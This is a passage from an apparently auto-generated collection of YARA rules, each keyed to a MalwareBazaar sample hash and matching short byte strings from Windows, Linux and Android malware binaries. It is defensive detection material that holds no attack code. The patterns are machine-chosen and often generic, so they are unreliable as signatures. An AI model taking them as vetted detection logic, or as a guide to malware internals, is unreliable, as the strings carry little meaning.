        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "f 8Beja~"
        $s4 = "% 1_OI AR"
        $s5 = "\\Na Ah"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2967KB
        and all of them
}

rule Windows_4435491dfb816c72cd4efc7dde03acfc8ea703dba2114d513d687172d720f6da
{
    meta:
        description = "Auto ML: 4435491dfb816c72cd4efc7dde03acfc8ea703dba2114d513d687172d720f6da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6255KB
        and all of them
}

rule Windows_444b77c224199fbcb8e1241f999ea02b68e5cee7d74f262c160ae45d85cf1105
{
    meta:
        description = "Auto ML: 444b77c224199fbcb8e1241f999ea02b68e5cee7d74f262c160ae45d85cf1105"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Go build ID: \"X6lNEpDhc_qgQl56"
        $s3 = "x4du/fgVJOqLlPCCIekQhFnHL/rkxe6t"
        $s4 = "XCgHEz88otHrz/Y-lXW-OhiIbzg3-m~"
        $s5 = "ioGRz\""

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB
        and all of them
}

rule Windows_447656e07d6d1d6fb418d284c5667445e92a7953e2529a28e1c23d597ce148da
{
    meta:
        description = "Auto ML: 447656e07d6d1d6fb418d284c5667445e92a7953e2529a28e1c23d597ce148da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "_VVVVV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 258KB
        and all of them
}

rule Windows_4483a8b063ed1fe1b273f8de9ee77e7f4bdd037f64c406e5f97240bf87d280d0
{
    meta:
        description = "Auto ML: 4483a8b063ed1fe1b273f8de9ee77e7f4bdd037f64c406e5f97240bf87d280d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 745KB
        and all of them
}

rule Windows_448581d13d9e2c91517959dd42d100b69419802a9c4387b87d50c5a87a749100
{
    meta:
        description = "Auto ML: 448581d13d9e2c91517959dd42d100b69419802a9c4387b87d50c5a87a749100"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.buildid5"
        $s4 = "@.data"
        $s5 = "@.eh_fram"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1831KB
        and all of them
}

rule Windows_44bcd434152120ee0a54faa492cadf39c04ce7ddde871ab6ba053a343a512d0f
{
    meta:
        description = "Auto ML: 44bcd434152120ee0a54faa492cadf39c04ce7ddde871ab6ba053a343a512d0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_44cb3224a4807ac22c1f377956c092a9a05d18e0ba589a8c6504ba083df5d179
{
    meta:
        description = "Auto ML: 44cb3224a4807ac22c1f377956c092a9a05d18e0ba589a8c6504ba083df5d179"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_44e639bba7c908625909ccc32eaaaa343591873b037a877fe21db85652b24564
{
    meta:
        description = "Auto ML: 44e639bba7c908625909ccc32eaaaa343591873b037a877fe21db85652b24564"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4598KB
        and all of them
}

rule Windows_455a6a7f15ba86a0fe02ae1d8beff7a3dc8e858380244a45141054b0d330135c
{
    meta:
        description = "Auto ML: 455a6a7f15ba86a0fe02ae1d8beff7a3dc8e858380244a45141054b0d330135c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "iu?Zf$"
        $s5 = "o?SZyv"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12418KB
        and all of them
}

rule Linux_4565415c5ec2829a3259f14537f4a651533c5db25262665c4366833c2a2441f9
{
    meta:
        description = "Auto ML: 4565415c5ec2829a3259f14537f4a651533c5db25262665c4366833c2a2441f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = ".Tu6yJ"
        $s3 = "A{zYNG"
        $s4 = "'ClG>+d"
        $s5 = "Pjy)]n"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB
        and all of them
}

rule Windows_058dc25297c1b2b8bc2c9d21acef07934f70fc8ae0fa5830c65a7b61eeb4346a
{
    meta:
        description = "Auto ML: 058dc25297c1b2b8bc2c9d21acef07934f70fc8ae0fa5830c65a7b61eeb4346a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6803KB
        and all of them
}

rule Windows_45dfd4cd57257e9fb4b967c4a6bd4059399615cf8ecb39fd692025f4f241c3d5
{
    meta:
        description = "Auto ML: 45dfd4cd57257e9fb4b967c4a6bd4059399615cf8ecb39fd692025f4f241c3d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff%"
        $s5 = "#ffffff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 489KB
        and all of them
}

rule Linux_45f1a4a57738e0da4bd7a846b715c346fedcc68f7b9ddc9a76e78a0ae0d120e6
{
    meta:
        description = "Auto ML: 45f1a4a57738e0da4bd7a846b715c346fedcc68f7b9ddc9a76e78a0ae0d120e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",N^NuNV"
        $s2 = "N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "/AQhHoQ"
        $s5 = "HoPlHoP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB
        and all of them
}

rule Windows_460be9287a7336de0f0996ef9f6bcedcfb72b693d5d7e8ad38057e64a8ae4f69
{
    meta:
        description = "Auto ML: 460be9287a7336de0f0996ef9f6bcedcfb72b693d5d7e8ad38057e64a8ae4f69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB
        and all of them
}

rule Android_463498837437f9fab4120f2269de1d2029c0362980c42950839da240a7b8f702
{
    meta:
        description = "Auto ML: 463498837437f9fab4120f2269de1d2029c0362980c42950839da240a7b8f702"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme"
        $s2 = "^F+kSa"
        $s3 = "-elvI>"
        $s4 = ";t!HxT"
        $s5 = "#WM1tM"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 73740KB
        and all of them
}

rule Linux_46418981d8c7846bc82ac055492dbfd6f30f150c4ffcedd75bd42dbefb2912c1
{
    meta:
        description = "Auto ML: 46418981d8c7846bc82ac055492dbfd6f30f150c4ffcedd75bd42dbefb2912c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "V1ZS>K"
        $s2 = "k;j*oQ"
        $s3 = ")tLG*M{"
        $s4 = "q[,`cwA"
        $s5 = "HgkMp/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_464b1d4edf0290f166cde4d613e0736ed776bad4b39b48a2e97e3e6c98a6b067
{
    meta:
        description = "Auto ML: 464b1d4edf0290f166cde4d613e0736ed776bad4b39b48a2e97e3e6c98a6b067"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "q~Jn8d"
        $s2 = "_q~JV8N"
        $s3 = "PNnI4*/;K"
        $s4 = "rSq~JV8O"
        $s5 = "q~NPN8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB
        and all of them
}

rule Windows_468b604307b567958f106df5a1503da9ce04390eda7c83f67bc38d08a09156f0
{
    meta:
        description = "Auto ML: 468b604307b567958f106df5a1503da9ce04390eda7c83f67bc38d08a09156f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "X0C7H=OCL"
        $s5 = "C7H9OCL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 414KB
        and all of them
}

rule Windows_46a740caf7240211b8c2eb2ea95f5a8742a6d9002af7053100f62720aa7e5cbb
{
    meta:
        description = "Auto ML: 46a740caf7240211b8c2eb2ea95f5a8742a6d9002af7053100f62720aa7e5cbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Windows_46d0ec50967a080bb19f4c7e4939d55753391118c2d55c1b76ae543243bef025
{
    meta:
        description = "Auto ML: 46d0ec50967a080bb19f4c7e4939d55753391118c2d55c1b76ae543243bef025"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3749KB
        and all of them
}

rule Windows_46d5190fd7f6dc29f452951eeeacfff33677d3b620da637b2cba73514b7f1d3c
{
    meta:
        description = "Auto ML: 46d5190fd7f6dc29f452951eeeacfff33677d3b620da637b2cba73514b7f1d3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "kQRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1064KB
        and all of them
}

rule Linux_0597e7607f5c06e8387a3e131e6b21ee6551b1809aac748c7bf4053113cc5a1f
{
    meta:
        description = "Auto ML: 0597e7607f5c06e8387a3e131e6b21ee6551b1809aac748c7bf4053113cc5a1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"
        $s2 = "<!: acam"
        $s3 = "t#5't<1&1t8;8T"
        $s4 = "nt5$$81 t:; t2;!:0T"
        $s5 = "{6=:{6!'-6;,t?=88tymtT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Windows_46e646dcfb73f26f153653b020f9871da0dc1bbd39b518e159616e352ebee9fc
{
    meta:
        description = "Auto ML: 46e646dcfb73f26f153653b020f9871da0dc1bbd39b518e159616e352ebee9fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2378KB
        and all of them
}

rule Linux_46e8aaee811d697d728f1d9bc191decac381ed8989aefe0d28a182541e3dbd30
{
    meta:
        description = "Auto ML: 46e8aaee811d697d728f1d9bc191decac381ed8989aefe0d28a182541e3dbd30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",uQ0by2k"
        $s2 = "q'nT7|C"
        $s3 = "t+q-Xs"
        $s4 = "360VPFh"
        $s5 = "IyZGbg"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Windows_46f0d64ee75053434ba73658a438fd682cada47e1f57a6b67eb52d9815a76f88
{
    meta:
        description = "Auto ML: 46f0d64ee75053434ba73658a438fd682cada47e1f57a6b67eb52d9815a76f88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "|SUVWj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1061KB
        and all of them
}

rule Linux_46fc3bea567b436c1b405b6bd68db3dcc3c8108105dbfa100427d54a5bf4e779
{
    meta:
        description = "Auto ML: 46fc3bea567b436c1b405b6bd68db3dcc3c8108105dbfa100427d54a5bf4e779"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "9T$,tXf"
        $s2 = "D$L9T$L"
        $s3 = "^8QShR"
        $s4 = "E4tmPhHD"
        $s5 = "^8RShR"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 111KB
        and all of them
}

rule Linux_472c671509cfccf01e2978618ef913f527e9889693d6d9901924c7d35a77bc3f
{
    meta:
        description = "Auto ML: 472c671509cfccf01e2978618ef913f527e9889693d6d9901924c7d35a77bc3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "APe|l3j"
        $s3 = "AmH|g;\"'"
        $s4 = "Q]cln\\"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_4795b3e74b3a88891cbda6d7cb1ad17fc133266c3c95493ba0726975d9eb0046
{
    meta:
        description = "Auto ML: 4795b3e74b3a88891cbda6d7cb1ad17fc133266c3c95493ba0726975d9eb0046"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".zusah"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB
        and all of them
}

rule Windows_47b406b0d74b00d8a971a1a19c5e8eb0fefda295f946c05dff9e19ba369edaba
{
    meta:
        description = "Auto ML: 47b406b0d74b00d8a971a1a19c5e8eb0fefda295f946c05dff9e19ba369edaba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Windows_47d70838cbedc8b0e0634e51bde8a72035922bddc1177cc9210fa0adb967d6a2
{
    meta:
        description = "Auto ML: 47d70838cbedc8b0e0634e51bde8a72035922bddc1177cc9210fa0adb967d6a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RANDOMXV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4659KB
        and all of them
}

rule Windows_47dad8008a4505593c2626d8d1e4489e4626a13d373e749fd231434a10e1ff54
{
    meta:
        description = "Auto ML: 47dad8008a4505593c2626d8d1e4489e4626a13d373e749fd231434a10e1ff54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4467KB
        and all of them
}

rule Linux_4811bf0aa1b3ed16411d205d67811fa107400c7c50b57cd64b30250204fb3fb9
{
    meta:
        description = "Auto ML: 4811bf0aa1b3ed16411d205d67811fa107400c7c50b57cd64b30250204fb3fb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = ",7gaae"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 73KB
        and all of them
}

rule Windows_059f60cd43b55dc2cadcd89ea57b8b7c48ca2677e8dea439ac6a7d7b6d9593bb
{
    meta:
        description = "Auto ML: 059f60cd43b55dc2cadcd89ea57b8b7c48ca2677e8dea439ac6a7d7b6d9593bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "IEnumerable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB
        and all of them
}

rule Windows_4819b02f24cd343be795732e8d3b80c3823fccec1c152aaa4efd4184e1490006
{
    meta:
        description = "Auto ML: 4819b02f24cd343be795732e8d3b80c3823fccec1c152aaa4efd4184e1490006"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Bff J@"
        $s5 = "nxTa}j"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB
        and all of them
}

rule Windows_486d2fae164dfd24b2d443ffd775d83f33136a746bded12f3e05cade26bacd24
{
    meta:
        description = "Auto ML: 486d2fae164dfd24b2d443ffd775d83f33136a746bded12f3e05cade26bacd24"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "C1F<vm"
        $s5 = "dZ opz^a8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 902KB
        and all of them
}

rule Windows_48b0afb9f404d55c311994ab4da41e3aa6dacd23a1b8e0de1addfe6f9fea4d11
{
    meta:
        description = "Auto ML: 48b0afb9f404d55c311994ab4da41e3aa6dacd23a1b8e0de1addfe6f9fea4d11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich|?"
        $s3 = "`.managed"
        $s4 = "`.rdata"
        $s5 = "@.data"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5107KB
        and all of them
}

rule Windows_48e0f13774ec9d2897e8d6192f16f9b9a5688b770959dc5056864c1048e68de5
{
    meta:
        description = "Auto ML: 48e0f13774ec9d2897e8d6192f16f9b9a5688b770959dc5056864c1048e68de5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kqckrqwkXRQKrjvqJRQXJROIQJWVRQIJWIJRQWIIJRVIOQWOIJXQPE"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 481KB
        and all of them
}

rule Windows_48f9310ae3bd7b1b5ac53aad0ede4db7c136193369d4d2c58cec0f05ddddf84f
{
    meta:
        description = "Auto ML: 48f9310ae3bd7b1b5ac53aad0ede4db7c136193369d4d2c58cec0f05ddddf84f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4589KB
        and all of them
}

rule Linux_492724a10a77ea635a2a9024c53c5545776ce2b4353be439be9569fcdcf6e4fe
{
    meta:
        description = "Auto ML: 492724a10a77ea635a2a9024c53c5545776ce2b4353be439be9569fcdcf6e4fe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "d<St&l/:"
        $s2 = "rcn,F1"
        $s3 = "uwcHCI"
        $s4 = "qq[^cK"
        $s5 = "Fr,VGL"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Windows_493807123c2e449d0dcfdbd3443d083aef30a6aaea42381290572bab06090c0b
{
    meta:
        description = "Auto ML: 493807123c2e449d0dcfdbd3443d083aef30a6aaea42381290572bab06090c0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "c`XGR8"
        $s5 = "cXGR \""

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5186KB
        and all of them
}

rule Windows_496e7b61508c088d9ddd0c0607ff6561ef756ff2b5575b177ef6e2831f417b3d
{
    meta:
        description = "Auto ML: 496e7b61508c088d9ddd0c0607ff6561ef756ff2b5575b177ef6e2831f417b3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = ".ndata"
        $s4 = "Instu`"
        $s5 = "softuW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 597KB
        and all of them
}

rule Windows_4a02931e6f207775e87257b2a33b02cc655c520c05ca53c49b5c918cdd78157f
{
    meta:
        description = "Auto ML: 4a02931e6f207775e87257b2a33b02cc655c520c05ca53c49b5c918cdd78157f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 32559KB
        and all of them
}

rule Windows_4a0a4e9caa9ec0c910beb5023912bdc59e0d07d8a5d6162dd265740630d9268b
{
    meta:
        description = "Auto ML: 4a0a4e9caa9ec0c910beb5023912bdc59e0d07d8a5d6162dd265740630d9268b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1193KB
        and all of them
}

rule Windows_007d4a581f70c7d0a86307123df5d769c3d948dd9b7d5c4ec3b274f2b0bf3647
{
    meta:
        description = "Auto ML: 007d4a581f70c7d0a86307123df5d769c3d948dd9b7d5c4ec3b274f2b0bf3647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "FY;w r"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1283KB
        and all of them
}

rule Windows_05bae03c60d27c783ab3a71ba4c2207c7297629287b86e35cbee081365780561
{
    meta:
        description = "Auto ML: 05bae03c60d27c783ab3a71ba4c2207c7297629287b86e35cbee081365780561"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1180KB
        and all of them
}

rule Windows_4a44359e80cfd868a532fc075db9670c03c99e24f9ed69710dd43e68fedc8c97
{
    meta:
        description = "Auto ML: 4a44359e80cfd868a532fc075db9670c03c99e24f9ed69710dd43e68fedc8c97"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_4ac7d8a9a14447f7e60f14699384b340ef2564e6fad91727a0f3f2706c726b03
{
    meta:
        description = "Auto ML: 4ac7d8a9a14447f7e60f14699384b340ef2564e6fad91727a0f3f2706c726b03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "u>htnB"
        $s5 = "jXh0qB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 347KB
        and all of them
}

rule Windows_4acddc15352051552d4684fff6d07d18305cf7276d208adf7e2f59c5a70c909a
{
    meta:
        description = "Auto ML: 4acddc15352051552d4684fff6d07d18305cf7276d208adf7e2f59c5a70c909a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "+P+Q-!+PuE"
        $s4 = "+G+L+Qz"
        $s5 = "+`+a+b*+i+m8n"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2435KB
        and all of them
}

rule Windows_4ad7b8d228fe32d82b0373ce886f224f47c2e06a59d394c634160c70083b5f32
{
    meta:
        description = "Auto ML: 4ad7b8d228fe32d82b0373ce886f224f47c2e06a59d394c634160c70083b5f32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Richl."
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB
        and all of them
}

